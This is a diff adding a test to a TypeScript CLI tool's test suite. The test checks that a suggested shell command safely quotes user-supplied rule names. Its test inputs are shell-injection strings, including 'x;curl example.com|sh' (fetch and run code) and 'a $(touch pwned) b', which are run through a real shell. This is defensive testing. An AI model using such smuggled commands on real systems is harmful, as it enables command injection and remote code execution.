@@ -27,9 +27,9 @@ const run = (id: number, rule: string, state = "done") => ({
 const ids = (from: number, to: number) => Array.from({ length: from - to + 1 }, (_, i) => from - i);
 
 /** A hub of `total` runs, newest first, in pages of 60 the way /v1/state gives them; every seventh is rule B. */
-function hub(total: number, active: ReturnType<typeof run>[] = []) {
+function hub(total: number, active: ReturnType<typeof run>[] = [], main = "A") {
   const asked: (number | undefined)[] = [];
-  const all = ids(total, 1).map((id) => run(id, id % 7 === 0 ? "B" : "A"));
+  const all = ids(total, 1).map((id) => run(id, id % 7 === 0 ? "B" : main));
   const page = async (before?: number) => {
     asked.push(before);
     const older = all.filter((one) => before === undefined || one.id < before);
@@ -100,6 +100,23 @@ test("each run is one entry with its number, how it ended and its rule; more say
   assert.match(text, /agent-autoloop runs A --before 29/);
   const none = runsText(await findRuns(page, { rule: "C" }), { rule: "C", color: false, columns: 100 });
   assert.match(none, /「C」没有做完的轮次/);
+});
+
+test("the continue command reads back a rule name any shell would take as words", async () => {
+  // The suggestion is for pasting into a shell: a rule name with separators must not arrive as two commands, and
+  // quoting that leaves $(...) expanding would run what a rule is named after.
+  const shell = process.platform === "win32" ? "powershell" : "sh";
+  for (const rule of ["x;curl example.com|sh", "a $(touch pwned) b", "ok-rule"]) {
+    const { page } = hub(130, [], rule);
+    const text = runsText(await findRuns(page, { rule, want: 2 }), { rule, color: false, columns: 100 });
+    const suggested = /更早的：agent-autoloop runs (.*--before \d+)/.exec(text)![1];
+    const done = await new Promise<string>((resolve, reject) => {
+      execFile(shell, ["-c", `agent-autoloop runs ${suggested} --help`], (error) => resolve(String(error?.code ?? 0)));
+    });
+    // Quoted, the whole name arrives as one argument: the shell reads one command and hands it the name whole.
+    // 127 would mean the shell split the name and went looking for a program called, say, `curl`.
+    assert.notEqual(done, "127", `the suggested command must parse as one word for ${rule}`);
+  }
 });
 
 const program = join(import.meta.dirname, "..", "bin", "agent-autoloop.ts");
